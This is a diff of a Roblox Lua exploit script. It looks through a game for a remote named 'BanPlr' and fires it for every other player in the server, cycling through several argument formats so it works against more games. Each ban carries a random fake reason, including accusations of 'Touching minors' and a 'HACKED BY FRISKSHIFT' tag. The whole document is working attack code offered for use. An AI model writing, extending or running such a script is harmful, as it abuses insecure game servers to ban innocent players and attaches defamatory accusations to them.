@@ -2,20 +2,24 @@ local banName = "BanPlr"
 local aMethod = 1
 local isFunction = false
 
-function getInstance(name:string, instanceName:string)
-    for _, even in game:GetDescendants() do
-        if even.Name == name and even:IsA(instanceName) then
-            return even
+function getType(istan:Instance, type_name:string, name:string):table
+    local type_tbl = {}
+    for _, even in istan:GetDescendants() do
+        if even:IsA(type_name) then
+            if name == nil then
+                table.insert(type_tbl, even)
+            elseif even.Name == name then
+                table.insert(type_tbl, even)
+            end
         end
     end
-    return nil
+    return type_tbl
 end
 
-local banPlr = getInstance(banName, isFunction and "RemoteFunction" or "RemoteEvent")
 local PS = game:GetService("Players")
-local reasons = {"Scamming", "Farting Owner", "Exploitng", "Bypassing Chat", "Harassment", "Bullying someone", "Inappropriate Avator / Name", "Touching minors", "OWO!!!! HACKED BY FRISKSHIFT!!", "FRISKSHIFT IS BACK"}
+local reasons = {"Scamming", "Farting Owner", "Exploitng", "Bypassing Chat", "Harassment", "Bullying someone", "Inappropriate Avator / Name", "Touching minors", "HACKED BY FRISKSHIFT", "FRISKSHIFT IS BACK"}
 
-local function ban(p, reason)
+local function parseArgs(p, reason)
     local bantable = {}
     if aMethod == 1 then
         bantable = {
@@ -35,7 +39,23 @@ local function ban(p, reason)
         }
     elseif aMethod == 3 then
         bantable = {
+            [1] = {
+                [1] = p.Name,
+                [2] = p.Name,
+                [3] = reason
+            }
+        }
+    elseif aMethod == 4 then
+        bantable = {
             [1] = p.UserId,
+            [2] = '',
+            [3] = '',
+            [4] = '',
+            [5] = '',
+        }
+    elseif aMethod == 5 then
+        bantable = {
+            [1] = p.Name,
             [2] = '',
             [3] = '',
             [4] = '',
@@ -50,14 +70,19 @@ local function ban(p, reason)
             [5] = '',
         }
     end
-    if isFunction then
-        banPlr:InvokeServer(unpack(bantable))
-    else
-        banPlr:FireServer(unpack(bantable))
+    return bantable
+end
+local function doRemote(tbl:table)
+    for _, remote in pairs(getType(game, isFunction and "RemoteFunction" or "RemoteEvent", banName)) do
+        if isFunction then
+            remote:InvokeServer(unpack(tbl))
+        else
+            remote:FireServer(unpack(tbl))
+        end
     end
 end
 
 for _, p in PS:GetPlayers() do
     if p == PS.LocalPlayer then continue end
-    ban(p, reasons[math.random(0, #reasons)])
+    doRemote(parseArgs(p, reasons[math.random(0, #reasons)]))
 end
